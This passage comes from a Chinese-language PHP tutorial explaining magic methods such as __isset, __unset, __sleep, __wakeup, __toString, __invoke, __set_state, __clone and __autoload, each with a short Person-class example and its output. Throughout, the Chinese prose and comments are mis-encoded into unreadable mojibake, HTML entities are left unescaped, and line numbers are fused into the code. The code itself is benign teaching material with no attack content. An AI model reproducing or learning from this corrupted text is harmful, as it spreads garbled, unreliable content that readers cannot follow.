ä¸Šä¸€ä¸ª__isset()æ–¹æ³•å°±å¯ä»¥äº†ï¼Œå½“åœ¨ç±»å¤–éƒ¨ä½¿ç”¨isset()å‡½æ•°æ¥æµ‹å®šå¯¹è±¡é‡Œé¢çš„ç§æœ‰æˆå‘˜æ˜¯å¦è¢«è®¾å®šæ—¶ï¼Œå°±ä¼šè‡ªåŠ¨è°ƒç”¨ç±»é‡Œé¢çš„__isset()æ–¹æ³•äº†å¸®æˆ‘ä»¬å®Œæˆè¿™æ ·çš„æ“ä½œã€‚ __isset()çš„ä½œç”¨ï¼šå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨ isset() æˆ– empty() æ—¶ï¼Œ__isset() ä¼šè¢«è°ƒç”¨ã€‚ è¯·çœ‹ä¸‹é¢ä»£ç æ¼”ç¤ºï¼š 1234567891011121314151617181920212223242526272829&lt;?phpclass Person{ public $sex; private $name; private $age; public function __construct($name=&quot;&quot;, $age=25, $sex='ç”·') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } /** * @param $content * * @return bool */ public function __isset($content) { echo &quot;å½“åœ¨ç±»å¤–éƒ¨ä½¿ç”¨isset()å‡½æ•°æµ‹å®šç§æœ‰æˆå‘˜{$content}æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨&lt;br&gt;&quot;; echo isset($this-&gt;$content); }}$person = new Person(&quot;å°æ˜&quot;, 25); // åˆå§‹èµ‹å€¼echo isset($person-&gt;sex),&quot;&lt;br&gt;&quot;;echo isset($person-&gt;name),&quot;&lt;br&gt;&quot;;echo isset($person-&gt;age),&quot;&lt;br&gt;&quot;; è¿è¡Œç»“æœå¦‚ä¸‹ï¼š 123451 // public å¯ä»¥ isset()å½“åœ¨ç±»å¤–éƒ¨ä½¿ç”¨isset()å‡½æ•°æµ‹å®šç§æœ‰æˆå‘˜nameæ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨ // __isset() å†… ç¬¬ä¸€ä¸ªecho1 // __isset() å†…ç¬¬äºŒä¸ªechoå½“åœ¨ç±»å¤–éƒ¨ä½¿ç”¨isset()å‡½æ•°æµ‹å®šç§æœ‰æˆå‘˜ageæ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨ // __isset() å†… ç¬¬ä¸€ä¸ªecho1 // __isset() å†…ç¬¬äºŒä¸ªecho å…«ã€ __unset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset()æ—¶è¢«è°ƒç”¨ã€‚çœ‹è¿™ä¸ªæ–¹æ³•ä¹‹å‰å‘¢ï¼Œæˆ‘ä»¬ä¹Ÿå…ˆæ¥çœ‹ä¸€ä¸‹ unset() å‡½æ•°ï¼Œunset()è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯åˆ é™¤æŒ‡å®šçš„å˜é‡ä¸”ä¼ å›trueï¼Œå‚æ•°ä¸ºè¦åˆ é™¤çš„å˜é‡ã€‚ é‚£ä¹ˆå¦‚æœåœ¨ä¸€ä¸ªå¯¹è±¡å¤–éƒ¨å»åˆ é™¤å¯¹è±¡å†…éƒ¨çš„æˆå‘˜å±æ€§ç”¨unset()å‡½æ•°å¯ä»¥å—ï¼Ÿ è¿™é‡Œè‡ªç„¶ä¹Ÿæ˜¯åˆ†ä¸¤ç§æƒ…å†µï¼š 1ã€ å¦‚æœä¸€ä¸ªå¯¹è±¡é‡Œé¢çš„æˆå‘˜å±æ€§æ˜¯å…¬æœ‰çš„ï¼Œå°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°åœ¨å¯¹è±¡å¤–é¢åˆ é™¤å¯¹è±¡çš„å…¬æœ‰å±æ€§ã€‚ 2ã€ å¦‚æœå¯¹è±¡çš„æˆå‘˜å±æ€§æ˜¯ç§æœ‰çš„ï¼Œæˆ‘ä½¿ç”¨è¿™ä¸ªå‡½æ•°å°±æ²¡æœ‰æƒé™å»åˆ é™¤ã€‚ è™½ç„¶æœ‰ä»¥ä¸Šä¸¤ç§æƒ…å†µï¼Œä½†æˆ‘æƒ³è¯´çš„æ˜¯åŒæ ·å¦‚æœä½ åœ¨ä¸€ä¸ªå¯¹è±¡é‡Œé¢åŠ ä¸Š__unset()è¿™ä¸ªæ–¹æ³•ï¼Œå°±å¯ä»¥åœ¨å¯¹è±¡çš„å¤–éƒ¨å»åˆ é™¤å¯¹è±¡çš„ç§æœ‰æˆå‘˜å±æ€§äº†ã€‚åœ¨å¯¹è±¡é‡Œé¢åŠ ä¸Šäº†__unset()è¿™ä¸ªæ–¹æ³•ä¹‹åï¼Œåœ¨å¯¹è±¡å¤–éƒ¨ä½¿ç”¨â€œunset()â€å‡½æ•°åˆ é™¤å¯¹è±¡å†…éƒ¨çš„ç§æœ‰æˆå‘˜å±æ€§æ—¶ï¼Œå¯¹è±¡ä¼šè‡ªåŠ¨è°ƒç”¨__unset()å‡½æ•°æ¥å¸®æˆ‘ä»¬åˆ é™¤å¯¹è±¡å†…éƒ¨çš„ç§æœ‰æˆå‘˜å±æ€§ã€‚ è¯·çœ‹å¦‚ä¸‹ä»£ç ï¼š 1234567891011121314151617181920212223242526272829&lt;?phpclass Person{ public $sex; private $name; private $age; public function __construct($name=&quot;&quot;, $age=25, $sex='ç”·') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } /** * @param $content * * @return bool */ public function __unset($content) { echo &quot;å½“åœ¨ç±»å¤–éƒ¨ä½¿ç”¨unset()å‡½æ•°æ¥åˆ é™¤ç§æœ‰æˆå‘˜æ—¶è‡ªåŠ¨è°ƒç”¨çš„&lt;br&gt;&quot;; echo isset($this-&gt;$content); }}$person = new Person(&quot;å°æ˜&quot;, 25); // åˆå§‹èµ‹å€¼unset($person-&gt;sex);unset($person-&gt;name);unset($person-&gt;age); è¿è¡Œç»“æœï¼š 123å½“åœ¨ç±»å¤–éƒ¨ä½¿ç”¨unset()å‡½æ•°æ¥åˆ é™¤ç§æœ‰æˆå‘˜æ—¶è‡ªåŠ¨è°ƒç”¨çš„1å½“åœ¨ç±»å¤–éƒ¨ä½¿ç”¨unset()å‡½æ•°æ¥åˆ é™¤ç§æœ‰æˆå‘˜æ—¶è‡ªåŠ¨è°ƒç”¨çš„1 ä¹ã€ __sleep()ï¼Œæ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°serialize() å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• __sleep()ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™è¯¥æ–¹æ³•ä¼šä¼˜å…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚ æ­¤åŠŸèƒ½å¯ä»¥ç”¨äºæ¸…ç†å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„ã€‚ å¦‚æœè¯¥æ–¹æ³•æœªè¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™ NULL è¢«åºåˆ—åŒ–ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª E_NOTICE çº§åˆ«çš„é”™è¯¯ã€‚ æ³¨æ„ï¼š 1__sleep() ä¸èƒ½è¿”å›çˆ¶ç±»çš„ç§æœ‰æˆå‘˜çš„åå­—ã€‚è¿™æ ·åšä¼šäº§ç”Ÿä¸€ä¸ª E_NOTICE çº§åˆ«çš„é”™è¯¯ã€‚å¯ä»¥ç”¨ Serializable æ¥å£æ¥æ›¿ä»£ã€‚ ä½œç”¨ï¼š 1__sleep() æ–¹æ³•å¸¸ç”¨äºæäº¤æœªæäº¤çš„æ•°æ®ï¼Œæˆ–ç±»ä¼¼çš„æ¸…ç†æ“ä½œã€‚åŒæ—¶ï¼Œå¦‚æœæœ‰ä¸€äº›å¾ˆå¤§çš„å¯¹è±¡ï¼Œä½†ä¸éœ€è¦å…¨éƒ¨ä¿å­˜ï¼Œè¿™ä¸ªåŠŸèƒ½å°±å¾ˆå¥½ç”¨ã€‚ å…·ä½“è¯·å‚è€ƒå¦‚ä¸‹ä»£ç ï¼š 123456789101112131415161718192021222324252627&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='ç”·') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } /** * @return array */ public function __sleep() { echo &quot;å½“åœ¨ç±»å¤–éƒ¨ä½¿ç”¨serialize()æ—¶ä¼šè°ƒç”¨è¿™é‡Œçš„__sleep()æ–¹æ³•&lt;br&gt;&quot;; $this-&gt;name = base64_encode($this-&gt;name); return array('name', 'age'); // è¿™é‡Œå¿…é¡»è¿”å›ä¸€ä¸ªæ•°å€¼ï¼Œé‡Œè¾¹çš„å…ƒç´ è¡¨ç¤ºè¿”å›çš„å±æ€§åç§° }}$person = new Person('å°æ˜'); // åˆå§‹èµ‹å€¼echo serialize($person);echo '&lt;br/&gt;'; ä»£ç è¿è¡Œç»“æœï¼š 12å½“åœ¨ç±»å¤–éƒ¨ä½¿ç”¨serialize()æ—¶ä¼šè°ƒç”¨è¿™é‡Œçš„__sleep()æ–¹æ³•O:6:&quot;Person&quot;:2:{s:4:&quot;name&quot;;s:8:&quot;5bCP5piO&quot;;s:3:&quot;age&quot;;i:25;} åã€ __wakeup()ï¼Œæ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°å¦‚æœè¯´ __sleep() æ˜¯ç™½çš„ï¼Œé‚£ä¹ˆ __wakeup() å°±æ˜¯é»‘çš„äº†ã€‚ é‚£ä¹ˆä¸ºä»€ä¹ˆå‘¢ï¼Ÿ å› ä¸ºï¼š 1ä¸ä¹‹ç›¸åï¼Œ`unserialize()` ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª `__wakeup()` æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ `__wakeup` æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚ ä½œç”¨ï¼š 1__wakeup() ç»å¸¸ç”¨åœ¨ååºåˆ—åŒ–æ“ä½œä¸­ï¼Œä¾‹å¦‚é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥ï¼Œæˆ–æ‰§è¡Œå…¶å®ƒåˆå§‹åŒ–æ“ä½œã€‚ è¿˜æ˜¯çœ‹ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='ç”·') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } /** * @return array */ public function __sleep() { echo &quot;å½“åœ¨ç±»å¤–éƒ¨ä½¿ç”¨serialize()æ—¶ä¼šè°ƒç”¨è¿™é‡Œçš„__sleep()æ–¹æ³•&lt;br&gt;&quot;; $this-&gt;name = base64_encode($this-&gt;name); return array('name', 'age'); // è¿™é‡Œå¿…é¡»è¿”å›ä¸€ä¸ªæ•°å€¼ï¼Œé‡Œè¾¹çš„å…ƒç´ è¡¨ç¤ºè¿”å›çš„å±æ€§åç§° } /** * __wakeup */ public function __wakeup() { echo &quot;å½“åœ¨ç±»å¤–éƒ¨ä½¿ç”¨unserialize()æ—¶ä¼šè°ƒç”¨è¿™é‡Œçš„__wakeup()æ–¹æ³•&lt;br&gt;&quot;; $this-&gt;name = 2; $this-&gt;sex = 'ç”·'; // è¿™é‡Œä¸éœ€è¦è¿”å›æ•°ç»„ }}$person = new Person('å°æ˜'); // åˆå§‹èµ‹å€¼var_dump(serialize($person));var_dump(unserialize(serialize($person))); è¿è¡Œç»“æœï¼š 1234å½“åœ¨ç±»å¤–éƒ¨ä½¿ç”¨serialize()æ—¶ä¼šè°ƒç”¨è¿™é‡Œçš„__sleep()æ–¹æ³•string(58) &quot;O:6:&quot;Person&quot;:2:{s:4:&quot;name&quot;;s:8:&quot;5bCP5piO&quot;;s:3:&quot;age&quot;;i:25;}&quot; å½“åœ¨ç±»å¤–éƒ¨ä½¿ç”¨serialize()æ—¶ä¼šè°ƒç”¨è¿™é‡Œçš„__sleep()æ–¹æ³•å½“åœ¨ç±»å¤–éƒ¨ä½¿ç”¨unserialize()æ—¶ä¼šè°ƒç”¨è¿™é‡Œçš„__wakeup()æ–¹æ³•object(Person)#2 (3) { [&quot;sex&quot;]=&gt; string(3) &quot;ç”·&quot; [&quot;name&quot;]=&gt; int(2) [&quot;age&quot;]=&gt; int(25) } åä¸€ã€ __toString()ï¼Œç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•ä½œç”¨ï¼š 1__toString() æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚ä¾‹å¦‚ `echo $obj;` åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆã€‚ æ³¨æ„ï¼š 1æ­¤æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™å°†å‘å‡ºä¸€æ¡ `E_RECOVERABLE_ERROR` çº§åˆ«çš„è‡´å‘½é”™è¯¯ã€‚ è­¦å‘Šï¼š 1ä¸èƒ½åœ¨ __toString() æ–¹æ³•ä¸­æŠ›å‡ºå¼‚å¸¸ã€‚è¿™ä¹ˆåšä¼šå¯¼è‡´è‡´å‘½é”™è¯¯ã€‚ ä»£ç ï¼š 12345678910111213141516171819202122&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='ç”·') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } public function __toString() { return 'go go go'; }}$person = new Person('å°æ˜'); // åˆå§‹èµ‹å€¼echo $person; ç»“æœï¼š 1go go go é‚£ä¹ˆå¦‚æœç±»ä¸­æ²¡æœ‰ __toString() è¿™ä¸ªé­”æœ¯æ–¹æ³•è¿è¡Œä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿè®©æˆ‘ä»¬æ¥æµ‹è¯•ä¸‹ï¼š ä»£ç ï¼š 123456789101112131415161718&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='ç”·') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } }$person = new Person('å°æ˜'); // åˆå§‹èµ‹å€¼echo $person; ç»“æœï¼š 1Catchable fatal error: Object of class Person could not be converted to string in D:\\phpStudy\\WWW\\test\\index.php on line 18 å¾ˆæ˜æ˜¾ï¼Œé¡µé¢æŠ¥äº†ä¸€ä¸ªè‡´å‘½é”™è¯¯ï¼Œè¿™æ˜¯è¯­æ³•æ‰€ä¸å…è®¸çš„ã€‚ åäºŒã€ __invoke()ï¼Œè°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•ä½œç”¨ï¼š 1å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ__invoke() æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚ æ³¨æ„ï¼š 1æœ¬ç‰¹æ€§åªåœ¨ PHP 5.3.0 åŠä»¥ä¸Šç‰ˆæœ¬æœ‰æ•ˆã€‚ ç›´æ¥ä¸Šä»£ç ï¼š 12345678910111213141516171819202122&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='ç”·') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } public function __invoke() { echo 'è¿™å¯æ˜¯ä¸€ä¸ªå¯¹è±¡å“¦'; }}$person = new Person('å°æ˜'); // åˆå§‹èµ‹å€¼$person(); æŸ¥çœ‹è¿è¡Œç»“æœï¼š 1è¿™å¯æ˜¯ä¸€ä¸ªå¯¹è±¡å“¦ å½“ç„¶ï¼Œå¦‚æœä½ æ‰§æ„è¦å°†å¯¹è±¡å½“å‡½æ•°æ–¹æ³•ä½¿ç”¨ï¼Œé‚£ä¹ˆä¼šå¾—åˆ°ä¸‹é¢ç»“æœï¼š 1Fatal error: Function name must be a string in D:\\phpStudy\\WWW\\test\\index.php on line 18 åä¸‰ã€ __set_state()ï¼Œè°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚ä½œç”¨ï¼š 1è‡ª PHP 5.1.0 èµ·ï¼Œå½“è°ƒç”¨ var_export() å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚ å‚æ•°ï¼š 1æœ¬æ–¹æ³•çš„å”¯ä¸€å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­åŒ…å«æŒ‰ array('property' =&gt; value, ...) æ ¼å¼æ’åˆ—çš„ç±»å±æ€§ã€‚ ä¸‹é¢æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹åœ¨æ²¡æœ‰åŠ  __set_state() æƒ…å†µæŒ‰ä¸‹ï¼Œä»£ç åŠè¿è¡Œç»“æœå¦‚ä½•ï¼š ä¸Šä»£ç ï¼š 123456789101112131415161718&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='ç”·') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; }}$person = new Person('å°æ˜'); // åˆå§‹èµ‹å€¼var_export($person); çœ‹ç»“æœï¼š 1Person::__set_state(array( 'sex' =&gt; 'ç”·', 'name' =&gt; 'å°æ˜', 'age' =&gt; 25, )) å¾ˆæ˜æ˜¾ï¼Œå°†å¯¹è±¡ä¸­çš„å±æ€§éƒ½æ‰“å°å‡ºæ¥äº† åŠ äº† __set_state() ä¹‹åï¼š ç»§ç»­ä¸Šä»£ç ï¼š 1234567891011121314151617181920212223242526&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='ç”·') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } public static function __set_state($an_array) { $a = new Person(); $a-&gt;name = $an_array['name']; return $a; }}$person = new Person('å°æ˜'); // åˆå§‹èµ‹å€¼$person-&gt;name = 'å°çº¢';var_export($person); ç»§ç»­çœ‹ç»“æœï¼š 1Person::__set_state(array( 'sex' =&gt; 'ç”·', 'name' =&gt; 'å°çº¢', 'age' =&gt; 25, )) åå››ã€ __clone()ï¼Œå½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨åœ¨å¤šæ•°æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦å®Œå…¨å¤åˆ¶ä¸€ä¸ªå¯¹è±¡æ¥è·å¾—å…¶ä¸­å±æ€§ã€‚ä½†æœ‰ä¸€ä¸ªæƒ…å†µä¸‹ç¡®å®éœ€è¦ï¼šå¦‚æœä½ æœ‰ä¸€ä¸ª GTK çª—å£å¯¹è±¡ï¼Œè¯¥å¯¹è±¡æŒæœ‰çª—å£ç›¸å…³çš„èµ„æºã€‚ä½ å¯èƒ½ä¼šæƒ³å¤åˆ¶ä¸€ä¸ªæ–°çš„çª—å£ï¼Œä¿æŒæ‰€æœ‰å±æ€§ä¸åŸæ¥çš„çª—å£ç›¸åŒï¼Œä½†å¿…é¡»æ˜¯ä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼ˆå› ä¸ºå¦‚æœä¸æ˜¯æ–°çš„å¯¹è±¡ï¼Œé‚£ä¹ˆä¸€ä¸ªçª—å£ä¸­çš„æ”¹å˜å°±ä¼šå½±å“åˆ°å¦ä¸€ä¸ªçª—å£ï¼‰ã€‚è¿˜æœ‰ä¸€ç§æƒ…å†µï¼šå¦‚æœå¯¹è±¡ A ä¸­ä¿å­˜ç€å¯¹è±¡ B çš„å¼•ç”¨ï¼Œå½“ä½ å¤åˆ¶å¯¹è±¡ A æ—¶ï¼Œä½ æƒ³å…¶ä¸­ä½¿ç”¨çš„å¯¹è±¡ä¸å†æ˜¯å¯¹è±¡ B è€Œæ˜¯ B çš„ä¸€ä¸ªå‰¯æœ¬ï¼Œé‚£ä¹ˆä½ å¿…é¡»å¾—åˆ°å¯¹è±¡ A çš„ä¸€ä¸ªå‰¯æœ¬ã€‚ ä½œç”¨ï¼š 1å¯¹è±¡å¤åˆ¶å¯ä»¥é€šè¿‡ clone å…³é”®å­—æ¥å®Œæˆï¼ˆå¦‚æœå¯èƒ½ï¼Œè¿™å°†è°ƒç”¨å¯¹è±¡çš„ __clone() æ–¹æ³•ï¼‰ã€‚å¯¹è±¡ä¸­çš„ __clone() æ–¹æ³•ä¸èƒ½è¢«ç›´æ¥è°ƒç”¨ã€‚ è¯­æ³•ï¼š 1$copy_of_object = clone $object; æ³¨æ„ï¼š 123å½“å¯¹è±¡è¢«å¤åˆ¶åï¼ŒPHP 5 ä¼šå¯¹å¯¹è±¡çš„æ‰€æœ‰å±æ€§æ‰§è¡Œä¸€ä¸ªæµ…å¤åˆ¶ï¼ˆshallow copyï¼‰ã€‚æ‰€æœ‰çš„å¼•ç”¨å±æ€§ ä»ç„¶ä¼šæ˜¯ä¸€ä¸ªæŒ‡å‘åŸæ¥çš„å˜é‡çš„å¼•ç”¨ã€‚å½“å¤åˆ¶å®Œæˆæ—¶ï¼Œå¦‚æœå®šä¹‰äº† __clone() æ–¹æ³•ï¼Œåˆ™æ–°åˆ›å»ºçš„å¯¹è±¡ï¼ˆå¤åˆ¶ç”Ÿæˆçš„å¯¹è±¡ï¼‰ä¸­çš„ __clone() æ–¹æ³•ä¼šè¢«è°ƒç”¨ï¼Œå¯ç”¨äºä¿®æ”¹å±æ€§çš„å€¼ï¼ˆå¦‚æœæœ‰å¿…è¦çš„è¯ï¼‰ã€‚ çœ‹ä»£ç ï¼š 1234567891011121314151617181920212223242526272829&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='ç”·') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } public function __clone() { echo __METHOD__.&quot;ä½ æ­£åœ¨å…‹éš†å¯¹è±¡&lt;br&gt;&quot;; }}$person = new Person('å°æ˜'); // åˆå§‹èµ‹å€¼$person2 = clone $person;var_dump('persion1:');var_dump($person);echo '&lt;br&gt;';var_dump('persion2:');var_dump($person2); çœ‹ç»“æœï¼š 123Person::__cloneä½ æ­£åœ¨å…‹éš†å¯¹è±¡string(9) &quot;persion1:&quot; object(Person)#1 (3) { [&quot;sex&quot;]=&gt; string(3) &quot;ç”·&quot; [&quot;name&quot;]=&gt; string(6) &quot;å°æ˜&quot; [&quot;age&quot;]=&gt; int(25) } string(9) &quot;persion2:&quot; object(Person)#2 (3) { [&quot;sex&quot;]=&gt; string(3) &quot;ç”·&quot; [&quot;name&quot;]=&gt; string(6) &quot;å°æ˜&quot; [&quot;age&quot;]=&gt; int(25) } å…‹éš†æˆåŠŸã€‚ åäº”ã€__autoload()ï¼Œå°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»ä½œç”¨ï¼š 1ä½ å¯ä»¥é€šè¿‡å®šä¹‰è¿™ä¸ªå‡½æ•°æ¥å¯ç”¨ç±»çš„è‡ªåŠ¨åŠ è½½ã€‚ åœ¨é­”æœ¯å‡½æ•° __autoload() æ–¹æ³•å‡ºç°ä»¥å‰ï¼Œå¦‚æœä½ è¦åœ¨ä¸€ä¸ªç¨‹åºæ–‡ä»¶ä¸­å®ä¾‹åŒ–100ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆä½ å¿…é¡»ç”¨includeæˆ–è€…requireåŒ…å«è¿›æ¥100ä¸ªç±»æ–‡ä»¶ï¼Œæˆ–è€…ä½ æŠŠè¿™100ä¸ªç±»å®šä¹‰åœ¨åŒä¸€ä¸ªç±»æ–‡ä»¶ä¸­ â€”â€” ç›¸ä¿¡è¿™ä¸ªæ–‡ä»¶ä¸€å®šä¼šéå¸¸å¤§ï¼Œç„¶åä½ å°±ç—›è‹¦äº†ã€‚ ä½†æ˜¯æœ‰äº† __autoload() æ–¹æ³•ï¼Œä»¥åå°±ä¸å¿…ä¸ºæ­¤å¤§ä¼¤è„‘ç­‹äº†ï¼Œè¿™ä¸ªç±»ä¼šåœ¨ä½ å®ä¾‹åŒ–å¯¹è±¡ä¹‹å‰è‡ªåŠ¨åŠ è½½åˆ¶å®šçš„æ–‡ä»¶ã€‚ è¿˜æ˜¯é€šè¿‡ä¾‹å­æ¥çœ‹çœ‹å§ï¼š å…ˆçœ‹çœ‹ä»¥å¾€çš„æ–¹å¼ï¼š 123456789101112131415161718/** * æ–‡ä»¶non_autoload.php */ require_once('project/class/A.php'); require_once('project/class/B.php'); require_once('project/class/C.php'); if (æ¡ä»¶A) { $a = new A(); $b = new B(); $c = new C(); // â€¦ ä¸šåŠ¡é€»è¾‘ } else if (æ¡ä»¶B) { $a = newA(); $b = new B(); // â€¦ ä¸šåŠ¡é€»è¾‘ } çœ‹åˆ°äº†å—ï¼Ÿä¸ç”¨100ä¸ªï¼Œåªæ˜¯3ä¸ªçœ‹èµ·æ¥å°±æœ‰ç‚¹çƒ¦äº†ã€‚è€Œä¸”è¿™æ ·å°±ä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼šå¦‚æœè„šæœ¬æ‰§è¡Œâ€œæ¡ä»¶Bâ€è¿™ä¸ªåˆ†æ”¯æ—¶ï¼ŒC.phpè¿™ä¸ªæ–‡ä»¶å…¶å®æ²¡æœ‰å¿…è¦åŒ…å«ã€‚å› ä¸ºï¼Œä»»ä½•ä¸€ä¸ªè¢«åŒ…å«çš„æ–‡ä»¶ï¼Œæ— è®ºæ˜¯å¦ä½¿ç”¨ï¼Œå‡ä¼šè¢«phpå¼•æ“ç¼–è¯‘ã€‚å¦‚æœä¸ä½¿ç”¨ï¼Œå´è¢«ç¼–è¯‘ï¼Œè¿™æ ·å¯ä»¥è¢«è§†ä½œä¸€ç§èµ„æºæµªè´¹ã€‚æ›´è¿›ä¸€æ­¥ï¼Œå¦‚æœC.phpåŒ…å«äº†D.phpï¼ŒD.phpåŒ…å«äº†E.phpã€‚å¹¶ä¸”å¤§éƒ¨åˆ†æƒ…å†µéƒ½æ‰§è¡Œâ€œæ¡ä»¶Bâ€åˆ†æ”¯ï¼Œé‚£ä¹ˆå°±ä¼šæµªè´¹ä¸€éƒ¨åˆ†èµ„æºå»ç¼–è¯‘C.php,D.php,E.phpä¸‰ä¸ªâ€œæ— ç”¨â€çš„æ–‡ä»¶ã€‚ é‚£ä¹ˆå¦‚æœä½¿ç”¨ __autoload() æ–¹å¼å‘¢ï¼Ÿ 1234567891011121314151617181920/** * æ–‡ä»¶autoload_demo.php */ function __autoload($className) { $filePath = â€œproject/class/{$className}.phpâ€; if (is_readable($filePath)) { require($filePath); } } if (æ¡ä»¶A) { $a = new A(); $b = new B(); $c = new C(); // â€¦ ä¸šåŠ¡é€»è¾‘ } else if (æ¡ä»¶B) { $a = newA(); $b = new B(); // â€¦ ä¸šåŠ¡é€»è¾‘ } ok,ä¸è®ºæ•ˆç‡æ€ä¹ˆç”¨ï¼Œæœ€èµ·ç ç•Œé¢çœ‹èµ·æ¥èˆ’æœå¤šäº†ï¼Œæ²¡æœ‰å¤ªå¤šå†—ä½™çš„ä»£ã€‚ å†æ¥çœ‹çœ‹è¿™é‡Œçš„æ•ˆç‡å¦‚ä½•ï¼Œæˆ‘ä»¬åˆ†æä¸‹ï¼š å½“phpå¼•æ“ç¬¬ä¸€æ¬¡ä½¿ç”¨ç±»Aï¼Œä½†æ˜¯æ‰¾ä¸åˆ°æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ __autoload æ–¹æ³•ï¼Œå¹¶å°†ç±»åâ€œAâ€ä½œä¸ºå‚æ•°ä¼ å…¥ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬åœ¨ __autoload() ä¸­éœ€è¦çš„åšçš„å°±æ˜¯æ ¹æ®ç±»åï¼Œæ‰¾åˆ°ç›¸åº”çš„æ–‡ä»¶ï¼Œå¹¶åŒ…å«è¿›æ¥ï¼Œå¦‚æœæˆ‘ä»¬çš„æ–¹æ³•ä¹Ÿæ‰¾ä¸åˆ°ï¼Œé‚£ä¹ˆphpå¼•æ“å°±ä¼šæŠ¥é”™äº†ã€‚ æ³¨æ„ï¼š 1è¿™é‡Œå¯ä»¥åªç”¨requireï¼Œå› ä¸ºä¸€æ—¦åŒ…å«è¿›æ¥åï¼Œphpå¼•æ“å†é‡åˆ°ç±»Aæ—¶ï¼Œå°†ä¸ä¼šè°ƒç”¨__autoloadï¼Œè€Œæ˜¯ç›´æ¥ä½¿ç”¨å†…å­˜ä¸­çš„ç±»Aï¼Œä¸ä¼šå¯¼è‡´å¤šæ¬¡åŒ…å«ã€‚ æ‰©å±•ï¼š 1å…¶å®phpå‘å±•åˆ°ä»Šå¤©ï¼Œå·²ç»æœ‰å°† `spl_autoload_register` â€” æ³¨å†Œç»™å®šçš„å‡½æ•°ä½œä¸º __autoload 